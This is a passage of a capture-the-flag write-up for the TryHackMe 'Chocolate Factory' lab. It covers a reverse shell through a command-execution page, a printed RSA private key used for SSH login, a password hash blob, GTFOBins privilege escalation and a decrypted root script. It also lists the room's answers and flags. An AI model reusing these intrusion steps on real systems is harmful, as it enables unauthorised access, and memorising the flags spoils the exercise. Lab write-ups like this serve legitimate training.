+OTk5Ojc6OjoKX2d2bToqOjE4NDk2OjA6OTk5OTk6Nzo6OgpjaGFybGllOiQ2JENaSm5DUGVRV3A5
+L2pwTngka2hHbEZkSUNKbnI4UjNKQy9qVFIycjdEcmJGTHA4enE4NDY5ZDNjMC56dUtONHNlNjFG
+T2J3V0d4Y0hacU8yUkpIa2tMMWpqUFllZUd5SUpXRTgyWC86MTg1MzU6MDo5OTk5OTo3Ojo6Cg==
+</code></pre><ul id="3a4a136a-5d2c-4d7b-87cf-e2e8fe180756" class="bulleted-list"><li style="list-style-type:disc">I convert it to cyberchef from base64</li></ul><figure id="f8d08cff-19cc-4c8e-bb6c-196c89e91700" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled.png"><img style="width:1478px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled.png"/></a></figure><ul id="3f2dbda8-cd50-440d-9a80-1495f8c0858d" class="bulleted-list"><li style="list-style-type:disc">I try hashcat to dehashed the text but I can’t dehashed it even if I use john</li></ul><figure id="cb77ebac-39d7-4adc-a36d-6342cec1746e" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%201.png"><img style="width:916px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%201.png"/></a></figure><ul id="28e81e02-38f9-49e5-8559-5fda4167a295" class="bulleted-list"><li style="list-style-type:disc">Let’s move on spectate the directories</li></ul><figure id="9bf56d0d-2799-4683-85c8-2d84129c1b7a" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%202.png"><img style="width:677px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%202.png"/></a></figure><ul id="508c72b2-f057-463a-a422-caafc620a694" class="bulleted-list"><li style="list-style-type:disc">firstly let’s go to the main page</li></ul><figure id="95a7f230-ec1f-4deb-9a78-45bdcc366c97" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%203.png"><img style="width:888px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%203.png"/></a></figure><ul id="3a21bb08-7eee-4a40-bc41-6e779a937fbf" class="bulleted-list"><li style="list-style-type:disc">I don’t know the password or username let’s try the other directories</li></ul><ul id="eca832d5-4e25-4ce8-b69d-a99c742c18a0" class="bulleted-list"><li style="list-style-type:disc">It’s a command executioner lets use rev shell here</li></ul><figure id="186f0286-dbd4-4138-ada3-1af8e3c1f6a9" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%204.png"><img style="width:888px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%204.png"/></a></figure><figure id="07f4c4df-cdeb-4941-a0fc-3596cb73fddb" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%205.png"><img style="width:1105px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%205.png"/></a></figure><ul id="01de27fb-2341-45e4-abca-110dcdaa543a" class="bulleted-list"><li style="list-style-type:disc">And use netcat as a listener</li></ul><figure id="9beb84b6-232c-45f3-8424-03149b444a91" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%206.png"><img style="width:1105px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%206.png"/></a></figure><ul id="dce8542f-a690-4b51-beb3-b49beead90c6" class="bulleted-list"><li style="list-style-type:disc">when I use cat to the rev_key_rev my terminal is not functionable so I restart the shell and I use strings key_rev_shell to see the only strings inside the data</li></ul><figure id="06d56143-7bb4-4668-bb0a-97faf80e8680" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%207.png"><img style="width:1105px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%207.png"/></a></figure><p id="d4cf3e96-431c-4129-bc9a-8763971e20b4" class="">ANSWER : b’ -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=</p><h2 id="f2760582-d127-43e5-9929-0d4d7a24c519" class="">What is Charlie&#x27;s password?</h2><ul id="506ea9c3-0226-44bc-a4cf-f60e7eac2136" class="bulleted-list"><li style="list-style-type:disc">After I inspect the index.php.bak I try to cat the validate php and I found an account</li></ul><figure id="519f9f4a-be15-47ee-be38-39b0c9b48f06" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%208.png"><img style="width:1105px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%208.png"/></a></figure><p id="b40aa7bc-3596-4b46-a9e0-a468d5d5b118" class="">ANSWER: cn7824</p><h2 id="6406b996-cc2c-4f2d-9186-057d9dbf0ed8" class="">Enter the user flag</h2><figure id="545221fa-8c18-4fc3-bb5d-abf179568054" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%209.png"><img style="width:1105px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%209.png"/></a></figure><p id="bfad1a4c-967d-41af-838f-faef8d048957" class=""> </p><ul id="0c3aa1f4-a178-4eff-8c69-13253b095476" class="bulleted-list"><li style="list-style-type:disc">I can’t cat the user.txt so lets spectate the other file in charlie </li></ul><pre id="0c39c7ef-5181-446e-b8e8-a4690ade418d" class="code code-wrap"><code>-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+la7Oh0Kym+8P3Zu5fI0Iw8VBc/Q+KgkDnNJgzvGElkisD7oNHFKMmYQiMEtvE7GB
+FVSMoCo/n67H5TTgM3zX7qhn0UoKfo7EiUR5iKUAKYpfxnTKUk+IW6ME2vfJgsBg
+82DuYPjuItPHAdRselLyNwKBgH77Rv5Ml9HYGoPR0vTEpwRhI/N+WaMlZLXj4zTK
+37MWAz9nqSTza31dRSTh1+NAq0OHjTpkeAx97L+YF5KMJToXMqTIDS+pgA3fRamv
+ySQ9XJwpuSFFGdQb7co73ywT5QPdmgwYBlWxOKfMxVUcXybW/9FoQpmFipHsuBjb
+Jq4xAoGBAIQnMPLpKqBk/ZV+HXmdJYSrf2MACWwL4pQO9bQUeta0rZA6iQwvLrkM
+Qxg3lN2/1dnebKK5lEd2qFP1WLQUJqypo5TznXQ7tv0Uuw7o0cy5XNMFVwn/BqQm
+G2QwOAGbsQHcI0P19XgHTOB7Dm69rP9j1wIRBOF7iGfwhWdi+vln
+-----END RSA PRIVATE KEY-----</code></pre><ul id="8c4bfda2-0281-484a-a5f2-5153b967c29b" class="bulleted-list"><li style="list-style-type:disc">And I found this at teleport file</li></ul><ul id="8bd36a9e-eed9-4469-8f44-cf3d155dc7f3" class="bulleted-list"><li style="list-style-type:disc">I save the rsa key to nano and I use this command</li></ul><pre id="d2a4c086-5ba4-43e5-b5b3-d35372e8d086" class="code code-wrap"><code>ssh -i rsa charlie@&lt;ip&gt;</code></pre><figure id="29dac7bb-e5e4-40d4-bd22-8f65aef871ec" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%2010.png"><img style="width:960px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%2010.png"/></a></figure><p id="0e8101c3-1728-4467-99ca-a92f28645108" class="">ANSWER : flag{cd5509042371b34e4826e4838b522d2e}</p><h2 id="5b2bc5fa-03c5-49c5-b0ae-cf86c3c60eb6" class="">Enter the root flag</h2><figure id="1c969112-4b7e-4963-a6e7-01fa268fe403" class="image"><a href="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%2011.png"><img style="width:960px" src="Chocolate%20Factory%20THM%2058c1eb5b4845482f8a1e5ffb0532efca/Untitled%2011.png"/></a></figure><ul id="cd4ecf50-cfc4-48f5-96cf-337fb68bc35f" class="bulleted-list"><li style="list-style-type:disc">I can’t use sudo command so I tried to use sud0 -l</li></ul><p id="f52c62d4-92aa-4dea-8a7b-ba85f51140a0" class="">and I search vi to the </p><figure id="4754243c-e913-4276-978a-e188d32e0484"><a href="https://gtfobins.github.io/gtfobins/vi/" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">vi
+            
+            |
+            
+            GTFOBins</div></div><div class="bookmark-href"><img src="https://gtfobins.github.io/assets/logo.png" class="icon bookmark-icon"/>https://gtfobins.github.io/gtfobins/vi/</div></div></a></figure><ul id="6c72da06-9ed3-4ad9-b883-395076cb8cdd" class="bulleted-list"><li style="list-style-type:disc">I found out that in root folder I found a <a href="http://root.py">root.py</a> I cat the code and I found out that we need to use a key so I think that I can use the key in rev_key_rev</li></ul><pre id="86bb7ee5-c6d2-4175-a9c8-be5edd4e6ff0" class="code code-wrap"><code># ls
+root.py
+# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input(&quot;Enter the key:  &quot;)
+f=Fernet(key)
+encrypted_mess= &#x27;gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ&#x27;
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(&quot;You Are Now The Owner Of &quot;)
+display2=pyfiglet.figlet_format(&quot;Chocolate Factory &quot;)
+print(display1)
+print(display2)
+print(mess)#  
+# chmod +x root.py
+# python root.py
+Enter the key:  b&#x27; -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&#x27;
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | &#x27;__/ _ \ |  \| |/ _ \ \ /\ / /   | | | &#x27;_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / &#x27;_ \ / _ \ &#x27;__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | &#x27;_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| &#x27;__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec59161d338fef787fcb4e296b42124}
+#</code></pre><p id="4c242959-03d3-4030-bc19-7b68d347c057" class="">ANSWER : flag{cec59161d338fef787fcb4e296b42124}</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
